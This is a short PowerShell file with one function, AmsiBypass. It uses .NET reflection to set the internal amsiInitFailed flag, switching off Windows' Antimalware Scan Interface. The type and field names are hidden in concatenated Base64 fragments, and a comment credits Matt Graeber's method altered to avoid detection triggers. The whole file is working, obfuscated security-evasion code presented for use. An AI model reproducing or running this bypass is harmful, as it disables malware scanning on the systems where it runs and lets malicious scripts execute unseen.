function AmsiBypass
{
    #This is Matt Graebers Reflection method bypass with changes to triggers 
    (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
}
